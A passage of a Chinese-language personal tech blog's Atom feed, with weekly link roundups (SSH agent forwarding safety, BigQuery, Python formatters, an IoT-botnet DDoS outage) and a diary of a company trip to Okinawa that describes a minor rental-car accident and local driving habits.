&lt;/ul&gt;</summary><category term="apache"></category><category term="bbs"></category><category term="bsd"></category><category term="chrome"></category><category term="cli"></category><category term="cloud"></category><category term="container"></category><category term="django"></category><category term="dns"></category><category term="docker"></category><category term="interview"></category><category term="linux"></category><category term="misc"></category><category term="mysql"></category><category term="news"></category><category term="python"></category><category term="security"></category><category term="ubuntu"></category><category term="vim"></category><category term="批踢踢"></category></entry><entry><title>Y2016W43</title><link href="https://blog.m157q.tw/posts/2016/10/31/y2016w43/" rel="alternate"></link><published>2016-11-13T04:15:20+08:00</published><updated>2016-11-13T04:15:20+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-10-31:posts/2016/10/31/y2016w43/</id><summary type="html">&lt;h3&gt;bsd&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pacbsd.org/"&gt;PacBSD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;神奇的東西...  &lt;/li&gt;
&lt;li&gt;後來才發現原來它就是之前有看過的 ArchBSD，不知道為什麼改名字了，官方網站上 2014/09/14 的文章還寫著 ArchBSD 兩歲了，但下一篇文章卻是將近兩年後的 2016/07/21 然後已經改叫 PacBSD 哩  &lt;/li&gt;
&lt;li&gt;總之就是個用 Pacman 當 package management system 的 BSD Distribution，看來一開始裝起來也跟 Arch Linux 一樣乾淨，所以標榜 "A simple, lightweight distribution"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/10/ssh-agent-forwarding-tutorial/"&gt;SSH agent forwarding 教學&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來跳板機可以這樣設定比較安全呀  &lt;/li&gt;
&lt;li&gt;結果分享這篇以後就有人跟我說用 SSH &lt;code&gt;ForwardAgent&lt;/code&gt; 是不安全，要使用 SSH &lt;code&gt;ProxyCommand&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/10/ssh-agent-forwarding-tutorial/#comment-2998999934"&gt;順便跑去這篇文章底下回覆跟作者告知一下 SSH ForwardAgent 不安全的問題&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;紀錄一下相關文章  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://heipei.github.io/2015/02/26/SSH-Agent-Forwarding-considered-harmful/"&gt;SSH Agent Forwarding considered harmful&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://kkcliu.blogspot.tw/2015/06/ssh-proxycommand-to-tunnel-connections.html"&gt;SSH ProxyCommand to tunnel connections ~ Kashi's Place&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cloudplatform.googleblog.com/2016/09/using-BigQuery-and-Firebase-Analytics-to-understand-your-mobile-app.html"&gt;Using BigQuery and Firebase Analytics to understand your mobile app&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;直接把 Firebase 的資料接入 BigQuery，然後再運用 BigQuery 去撈出想要統計的資料，之後再用 &lt;a href="https://www.google.com/analytics/data-studio/"&gt;Data Studio&lt;/a&gt; 做資料視覺化，感覺挺方便的。  &lt;/li&gt;
&lt;li&gt;想到應該也可以用 GCP 的 Datalab 把 BigQuery 的資料拿來視覺化。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2016/09/29/debian-%e5%af%a6%e7%94%a8%e5%b0%8f%e6%8f%90%e7%a4%ba-2016-%e5%b9%b4%e7%89%88/"&gt;Debian 實用小提示 – 2016 年版&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是文章作者使用 Debian 多年以來的經驗彙整，應該可以算是 Debian 使用上的 Cheat Sheet 吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ihower.tw/blog/archives/8574"&gt;台灣資料科學愛好者年會: 一天搞懂深度學習 心得筆記&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;紀錄的滿詳細的一篇筆記。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://morepypy.blogspot.tw/2016/10/pypy3-550-released.html"&gt;PyPy3 5.5.0 released&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;針對 Python 3.3.5 的支援性做了一些改善  &lt;/li&gt;
&lt;li&gt;還有一些 JIT 相關的改善  &lt;/li&gt;
&lt;li&gt;著手開始進行 Python 3.5 的支援  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Psycojoker/pyfmt"&gt;Psycojoker/pyfmt: automatic code formatter for python following pep8 using baron FST, like gofmt&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有試用了一下，但我覺得沒有到很理想，所以沒有拿來用。  &lt;ul&gt;
&lt;li&gt;不會幫你把 unused import 拿掉  &lt;/li&gt;
&lt;li&gt;不會幫你超過一定的字數就換行  &lt;/li&gt;
&lt;li&gt;Python 2 only, 無法用 Python 3 執行  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.techbang.com/posts/47013-united-states-largest-internet-event-ever-knowing-that-hackers-attack-why-are-still-at-a-loss"&gt;美國史上最大斷網事件：明明知道駭客的攻擊方法，為何依然手足無措？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;萬物皆可駭，駭完就變僵屍哩。  &lt;/li&gt;
&lt;li&gt;出了一堆安全性極低的 Web Camera，一被打下來，就被拿來當 DDoS 的 client 之一了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;serverless&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/technology-coding/%E7%94%A8-serverless-%E4%BB%8B%E6%8E%A5-line-bot-api-e46f172e8028#.7ia9rvkdv"&gt;用 Serverless 介接 LINE bot API&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;圖文並茂的一篇介紹文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://feed.wordcorp.net/blog/post/dont-waste-dev-time"&gt;【一元翻譯作家】不要浪費開發時間：給新創公司的6個軟體開發建議&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看完覺得心有戚戚焉，跟目前在公司工作的狀況非常相似，可以拿來參考。  &lt;/li&gt;
&lt;li&gt;因為新創團隊往往人少，然後又必須快速開發，所以一定得有所取捨，無法盡善盡美。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;一、別在一開始就想要流程全自動&lt;br /&gt;
二、信任你的內部人員&lt;br /&gt;
三、把功能拆分成階段上線&lt;br /&gt;
四、盡量去追蹤網站的使用情況&lt;br /&gt;
五、工程師做做看客服，做做看業務&lt;br /&gt;
六、先讓介面簡單易用  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://Wix.com"&gt;It All Starts with Your Stunning Website&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看 Youtube 的時候看到這家的廣告點進去看到的，感覺可以很快且很方便生成漂亮的網站。  &lt;/li&gt;
&lt;li&gt;(2016/11/13 update) 不過最近陷入了用了 WordPress 的程式碼卻沒有遵守 GPL 而跟著公開 Wix 程式碼的爭議  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://ma.tt/2016/10/wix-and-the-gpl/"&gt;The Wix Mobile App, a WordPress Joint | Matt Mullenweg&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.theregister.co.uk/2016/10/31/wordpress_daddy_matt_mullenweg_says_wixcom_explicitly_contravenes_the_gpl/"&gt;WordPress daddy Matt Mullenweg says Wix.com 'explicitly contravenes the GPL' • The Register&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;批踢踢&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Gossiping/M.1477334602.A.5B8.html"&gt;Re: [問卦] 怎麼跟剛學程式的人解釋指標？ - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;指標竟然也可以講的如此煽情，只好收錄一下了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/C_Chat/M.1477243544.A.0E9.html"&gt;Re: [討論] 如何看出一個動漫腳色或作品,過氣與否?&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇超級認真的啊，根本已經是小論文的等級了啊啊啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;bbs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://spectrum.ieee.org/computing/networks/social-medias-dialup-ancestor-the-bulletin-board-system#.WBoy-tfJ4wY.twitter"&gt;Social Media’s Dial-Up Ancestor: The Bulletin Board System&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;BBS 的歷史，身為一個 BBS User，瞭解一下應該的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.businessinsider.com/george-hotz-comma-ai-shuts-down-driverless-car-project-2016-10"&gt;A famous hacker has terminated his self-driving car project after a government warning&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;唔，因為被政府說需要申請一堆文件才能上路，geohot 覺得太浪費生命所以不弄自動車，要去弄別的東西了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="bbs"></category><category term="bsd"></category><category term="cli"></category><category term="gcp"></category><category term="linux"></category><category term="machine learning"></category><category term="misc"></category><category term="python"></category><category term="security"></category><category term="serverless"></category><category term="software engineering"></category><category term="web"></category><category term="批踢踢"></category></entry><entry><title>2016 塔圖員工旅遊之沖繩五天四夜自由行</title><link href="https://blog.m157q.tw/posts/2016/10/25/2016-tagtoo-staff-travel-okinawa-japan/" rel="alternate"></link><published>2017-01-14T16:48:34+08:00</published><updated>2017-01-14T16:48:34+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-10-25:posts/2016/10/25/2016-tagtoo-staff-travel-okinawa-japan/</id><summary type="html">&lt;h2&gt;摘要&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;時間：2016/10/19 (三）~ 2016/10/25 （一）  &lt;ul&gt;
&lt;li&gt;去程是晚上六點五十五分的飛機  &lt;/li&gt;
&lt;li&gt;回程是早上六點的飛機  &lt;/li&gt;
&lt;li&gt;所以其實掐頭去尾的話大概就是玩個四天五夜吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;地點：沖繩県那霸市  &lt;/li&gt;
&lt;li&gt;照片  &lt;ul&gt;
&lt;li&gt;有點多，懶的一個一個補上來。  &lt;ul&gt;
&lt;li&gt;好像一直沒找到一個 Pelican 的 plugin 可以很方便的把照片整合進 blog post 裡面的。  &lt;/li&gt;
&lt;li&gt;這部份好像還是有個後台會方便些吧...?  &lt;/li&gt;
&lt;li&gt;之前好像有用過一個，但覺得不好用，之後看有沒有找到更好用的或者自己寫個 Pelican 的 plugin 吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 1: 2016/10/19（三）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;鰓呼吸  &lt;ul&gt;
&lt;li&gt;Airbnb 住處附近的一間日式料理店，一群人看到覺得還不錯，就進去吃了。  &lt;/li&gt;
&lt;li&gt;我們是 9 個人一起吃，但分成三組各三個人結帳。  &lt;/li&gt;
&lt;li&gt;印象很深的是點了一杯叫作「琉球王朝」的清酒，真的覺得很好喝。  &lt;/li&gt;
&lt;li&gt;還有一個印象很深刻的是蟹殼燒  &lt;/li&gt;
&lt;li&gt;第一次吃生馬肉，有紅肉跟白肉，口感差滿多的，紅肉部份其實沒啥特別感覺，但白肉的部份真的超級韌，很耐嚼。  &lt;/li&gt;
&lt;li&gt;第一次吃到沖繩的海葡萄，口感真的挺奇特的，搭配清爽的沾醬吃很不錯，不過海葡萄本身真的有點鹹就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 2: 2016/10/20（四）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;OTS 租車  &lt;ul&gt;
&lt;li&gt;開了一台五人座的小客車，沒記錯的話應該是 TOYOTA Camary Hybrid，其他兩組人則是七人座車。  &lt;/li&gt;
&lt;li&gt;真的覺得油電混合車滿好開的，挺省油的，電子儀表板會顯示油耗量，沒記錯的話好像是 21 KM/L。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;人生第一次出車禍就在日本（也算是種成就解鎖吧，但不希望是這種不好的解鎖啊啊啊）  &lt;ul&gt;
&lt;li&gt;右駕，沒抓好左邊的距離，又分心和副駕弄導航的功能，就擦撞到了在路邊臨停的車子。  &lt;/li&gt;
&lt;li&gt;車主應該覺得自己超衰吧，臨時停車在路邊進洗衣店洗衣服，結果車子就被個雷包外國人擦撞。  &lt;/li&gt;
&lt;li&gt;雖然租車的時候手冊上就有寫說即便在雙向只有單線的情況下，沖繩的路邊還是非常多路邊臨時停車，要小心注意，但我還是撞到了，當下心裡真的只有兩個字「慘了」。  &lt;/li&gt;
&lt;li&gt;感謝 Jay 幫我和警察還有用手機漫遊跟租車公司溝通  &lt;/li&gt;
&lt;li&gt;之後就和其他三位同事等沖繩當地的警察來。  &lt;ul&gt;
&lt;li&gt;總共來了兩位警察，一位女性警察詢問被我撞到的日本女車主，一位男性警察詢問我們。（是說沖繩的警察車挺可愛的，小小一台的。）  &lt;ul&gt;
&lt;li&gt;首先先詢問肇事車主是誰，並要求出示日文駕照譯本還有租車公司的租車憑據。  &lt;/li&gt;
&lt;li&gt;登記肇事車主的資料，用片假名登記中文名字的發音，中間基本上都是用簡單的英文溝通。  &lt;/li&gt;
&lt;li&gt;向警察描述事發過程，用紙筆畫出車子的位置再加上簡單的英文溝通。  &lt;/li&gt;
&lt;li&gt;要求我們打電話給租車公司，同事幫我稍微講了一下事情經過，然後把電話交給警察，由警察向租車公司溝通。  &lt;/li&gt;
&lt;li&gt;把我們帶去找被撞到的車主還有另外一位警察，算是確認雙方說法。  &lt;/li&gt;
&lt;li&gt;最後確認完以後警察就離去了，而我們因為已經落後其他兩車，然後擦撞以後除了車身左側有條長長的刮痕和左側視鏡有點搖搖欲墜以外，沒大礙，所以就跟租車公司說明天早上再去換車，然後就趕著開上沖繩的國道了。（人生第一次開車上國道也是在日本，台灣的國道我根本沒開過。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然後也感謝公司租車的時候有把保險保到最高的等級，所以直接由保險公司理賠，不然我應該要噴錢了吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沖繩水族館  &lt;ul&gt;
&lt;li&gt;最大的海生館真的挺棒的，裏面真的超多種海洋生物，一開始入口就有海星和海參可以摸，沒記錯的話好像還有派大星的原型 XD  &lt;ul&gt;
&lt;li&gt;虎鯊（小隻的虎鯊還會咬住媽媽的鰭一起游泳，超可愛。）、魟魚、藍鯨（日本好像叫甚平鮫？應該就是 One Piece 裏面那個甚平？）  &lt;/li&gt;
&lt;li&gt;可以到最上層去參觀最大的那個水池，工作人員潛水下去餵食也是從這邊，不過整個魚腥味很重，有種進到魚市場的感覺，然後很悶熱。  &lt;/li&gt;
&lt;li&gt;如果看到一半想出去或者看完以後還想再回來看的話，可以在出館的時候，讓工作人員在手上幫你蓋個隱形印章，再次入館的時候只要伸出手，讓工作人員用光線照一下你的手，有看到印章圖案就可以再進去了，我們後來又進去逛了一次 XD。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;去戶外劇場還看了海豚秀，而且還是萬聖節特別版，海豚可以從水中竄出，跳的超級高，大概有兩到三層樓吧。  &lt;/li&gt;
&lt;li&gt;去海龜館、海象館（海象超大隻，然後很愛吃南瓜，不知道是萬聖節特別餵的，還是本來就吃南瓜。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;燒肉乃我那霸新館  &lt;ul&gt;
&lt;li&gt;一開始開車開錯，開到舊館去，想說怎麼都沒人，才發現跑錯地方。  &lt;/li&gt;
&lt;li&gt;雖然新館就在附近而已，不過因為動線的關係，還是得繞個一大圈。  &lt;/li&gt;
&lt;li&gt;新館比舊館大上不少  &lt;ul&gt;
&lt;li&gt;水果和飲料是無限自助吧  &lt;/li&gt;
&lt;li&gt;肉類基本上也是無限取用，自己拿裝肉的黑色盤盒去開放式冰櫥櫃取用就行，櫥櫃的另外一邊就是店員在用機器切肉補貨，跟在台灣去賣場買肉頻有點類似。  &lt;ul&gt;
&lt;li&gt;擺放肉品的透明櫥櫃上都有用日文說明是什麼肉，也有特別用中文寫說不要浪費食材。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;佐料有非常多選擇，玫瑰海鹽、柚子醬、燒肉醬、七味粉等等，沒記錯的話好像有七種吧。  &lt;/li&gt;
&lt;li&gt;印象比較深刻的是裝醬料的瓶子，開口處是用金屬片加彈簧的設計，往後推開就可以倒醬料，不施力的話，鐵片就會因為彈簧的作用力而回到原位蓋上  &lt;/li&gt;
&lt;li&gt;夾燒肉的夾子末端有個特別的彎曲，方便夾一些比較難夾的肉品，是個頗貼心的小設計。  &lt;/li&gt;
&lt;li&gt;旁邊會有 MUJI 的衣架，可以給你掛大衣，以免吃完燒肉以後大衣都是濃濃的燒烤味。  &lt;/li&gt;
&lt;li&gt;店長特製的牛肉湯很好喝  &lt;/li&gt;
&lt;li&gt;店員超有活力的啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後大家在店門口合照留念  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 3: 2016/10/21（五）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;去 OTS 填寫車禍紀錄、換車  &lt;/li&gt;
&lt;li&gt;Aeon Mall  &lt;/li&gt;
&lt;li&gt;海邊打西瓜  &lt;/li&gt;
&lt;li&gt;Aeon Mall  &lt;/li&gt;
&lt;li&gt;海邊看星星  &lt;/li&gt;
&lt;li&gt;回程繞遠路多開了一段山路  &lt;/li&gt;
&lt;li&gt;暖暮吃拉麵當宵夜  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 4: 2016/10/22（六）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;走錯路，開到一個風景還不錯的小海島  &lt;/li&gt;
&lt;li&gt;outlet  &lt;ul&gt;
&lt;li&gt;星巴克日本限定焙茶拿鐵  &lt;/li&gt;
&lt;li&gt;BlueSeal  &lt;/li&gt;
&lt;li&gt;陪皓天去幫他妹買戒指  &lt;/li&gt;
&lt;li&gt;逛很大的家電 3C Mall  &lt;/li&gt;
&lt;li&gt;逛很大的書店  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;遇到巴士火燒車塞車  &lt;/li&gt;
&lt;li&gt;普天滿宮  &lt;/li&gt;
&lt;li&gt;還車  &lt;/li&gt;
&lt;li&gt;波照間沖繩料理  &lt;/li&gt;
&lt;li&gt;Union 超市  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 5: 2016/10/23（日）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;若狹海岸公園  &lt;/li&gt;
&lt;li&gt;三重城漁港出海浮潛  &lt;/li&gt;
&lt;li&gt;波上宮  &lt;/li&gt;
&lt;li&gt;國際通河豚料理  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 6: 2016/10/24（一）&lt;/h2&gt;
&lt;p&gt;日本時間早上七點多的飛機，&lt;br /&gt;
得從美榮橋站搭單軌電車到那霸機場，&lt;br /&gt;
再搭接駁車到廉價航空用的機場登機。  &lt;/p&gt;
&lt;p&gt;結果大家各種塞行李，&lt;br /&gt;
然後冰箱買了一堆酒放，&lt;br /&gt;
但沒喝完，也帶不走。&lt;br /&gt;
只好開始玩起桌遊，&lt;br /&gt;
邊玩邊喝。  &lt;/p&gt;
&lt;p&gt;然後陸陸續續的去睡，&lt;br /&gt;
我好像早上四點多才睡吧，&lt;br /&gt;
然後六點就起來搭飛機了。&lt;br /&gt;
感覺出國去玩好像都可以睡很少都不會累的感覺，&lt;br /&gt;
當然如果租車駕駛的話最好還是不要疲勞駕駛比較好就是，&lt;br /&gt;
主要是因為前幾天都得開車，&lt;br /&gt;
都只能晚上回來以後確定沒有要開車了才能喝酒，&lt;br /&gt;
然後又因為隔天要開車，得早睡，不能疲勞駕駛，所以不是那麼盡興，&lt;br /&gt;
只有最後一天能夠稍微真的放縱一點 XD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;一些跟開車有關的紀錄&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;路邊很多人臨時停車，路寬不大，基本上都是雙向單線，但其實要同時容納三台車的車寬是可以的，只是像我這種新手還是有點怕撞到就是。  &lt;/li&gt;
&lt;li&gt;在沖繩開車真的很舒服，基本上不會有人隨便切換車道。  &lt;/li&gt;
&lt;li&gt;雖然陽光跟台灣一樣很刺眼，但沒看到有人貼黑到看不見駕駛的隔熱紙，不知道是不是因為法律規定的關係？  &lt;/li&gt;
&lt;li&gt;如果你是直行車，但放慢速度讓待轉車轉彎的話，駕駛一定會跟你打個手勢，表示謝謝，因為沒有很黑的隔熱紙，所以你一定看得見對方跟你道謝。  &lt;/li&gt;
&lt;li&gt;如果你原本在某個車道直行，前方鄰近車道的駕駛切換到你的車道且距離你頗近，造成你必須減速的話，他們會用臨時停車燈閃兩下，表示謝謝。（雖然通常不會隨便切換車道）  &lt;/li&gt;
&lt;li&gt;只要你打方向燈要切換車道，基本上後方的車絕對會讓你切進車道，沒遇過有人不讓的。  &lt;ul&gt;
&lt;li&gt;但仍然不建議這麼做啦，我是因為路不熟，所以常常這樣臨時切換車道。  &lt;/li&gt;
&lt;li&gt;如果真的這樣切換車道了，可以用一下上面提到的方法，向後方的駕駛道謝一下。（雖然這個道謝方法我自己沒注意到，是聽同事講的。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;要下國道時，大概距離出口一公里左右開始就會分出一條最靠左的車道，要下交流道的駕駛會在這時候就開始乖乖的開向這條車道排隊，即便右邊的車道是比較空的，也不會有人為了搶快就開到這個車道，然後快要到出口的時候才打靠左的方向燈切進匝道。（雖然你這樣做後方的車還是會停下來讓你切入就是）  &lt;/li&gt;
&lt;li&gt;最高速限基本上只有在市區是真的  &lt;ul&gt;
&lt;li&gt;沖繩國道的最高速限是八十，但說成是最低速限也不為過。（我還一直問坐在副駕的同事，紅圈白底藍字真的是最高速限嗎？因為我開八十超級慢）  &lt;/li&gt;
&lt;li&gt;沖繩的國道上基本上沒見到測速照相機，也沒見到有警察偷架測速，所以一路超速基本上是可行的。  &lt;/li&gt;
&lt;li&gt;我覺得是因為很少有人隨意變換車道，所以即便超速，也沒有太大的危險性，除非爆胎之類的。  &lt;/li&gt;
&lt;li&gt;沖繩人自己也會超速，內車道基本上跟台灣差不多，都開 110 km/h 以上的。  &lt;/li&gt;
&lt;li&gt;晚上的沖繩高速公路比較多飆仔，出現一些開著跑車不打方向燈隨便亂切換車道的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;星期五晚上的飆仔（暴走族）很多，覺得比台灣的還囂張，看到以下幾種：  &lt;ul&gt;
&lt;li&gt;騎著普通重型機車成群結隊，大約十台左右，橫跨三個車道蛇行。  &lt;/li&gt;
&lt;li&gt;騎著普通重型機車沒戴安全帽雙載，超你的車，然後在前面某個紅綠燈停在路邊抽菸聊天，看你經過後再上來超你一次車。  &lt;/li&gt;
&lt;li&gt;騎著大型重型機車跟你一起等紅燈，綠燈的時候就油門催到底衝出去。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基本上不會聽到喇叭聲，會按喇叭的應該只有計程車司機，而且不是像台北這種問你要不要搭車的。  &lt;ul&gt;
&lt;li&gt;我是因為離預定時間已經落後，所以急著轉彎，沒有禮讓一台還有段距離的直行計程車，造成他必須減速而被他按喇叭。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Okinawa"></category><category term="Travel"></category><category term="Tagtoo"></category></entry><entry><title>Y2016W42</title><link href="https://blog.m157q.tw/posts/2016/10/24/y2016w42/" rel="alternate"></link><published>2016-10-29T01:31:24+08:00</published><updated>2016-10-29T01:31:24+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-10-24:posts/2016/10/24/y2016w42/</id><summary type="html">&lt;p&gt;這禮拜因為去沖繩員工旅遊，所以就沒有看什麼東西啦 QQ  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;container&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/"&gt;最近連續有兩篇 Linux container security 有關的文章，而且都有討論到 linux capibility 呢&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;firebase&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.inside.com.tw/2016/10/17/livemaps"&gt;三天開發出來的「聊天地圖」&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Firebase 拿來做這應用挺有趣的，&lt;a href="https://buzzorange.com/techorange/2016/10/18/livemaps/"&gt;雖然國外好像有人已經做過了&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;之前去 GCPUG 聽到 Firebase 相關的 talk 基本上都很強調 Firebase 可以滿簡單的達到這種即時的互動性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gae&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/tools/remoteapi"&gt;Remote API for Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GAE 存取跨 project 的 datastore 的方法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/7566416/different-commits-between-two-branches"&gt;Different commits between two branches&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 &lt;code&gt;git-cherry&lt;/code&gt; 可以拿來看兩個 branch 之間差哪些 commits 的呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.ponyorm.com/2016/10/12/pony-orm-release-0-7/"&gt;Pony ORM Release 0.7 | Pony ORM Releases&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/juanantoniofm/pythoniter"&gt;juanantoniofm/pythoniter: Little python formatter-beautifier online (web) i&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;架在 Google App Engine 上的 Python Formatter，不確定效果好不好就是。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pythoniter.appspot.com/"&gt;Pythoniter - Pretty Python Online Formatter&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;tool&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://17ce.com"&gt;网站测速 | 网站速度测试 | 网速测试 | 电信 | 联通 | 网通 | 全国 | 监控 | CDN|PING|DNS 17CE.COM&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;又發現個拿來測中國各電信連線狀況的工具  &lt;/li&gt;
&lt;li&gt;之前還看過的幾個也順便紀錄一下：  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://ping.chinaz.com/"&gt;http://ping.chinaz.com/&lt;/a&gt;  &lt;/li&gt;
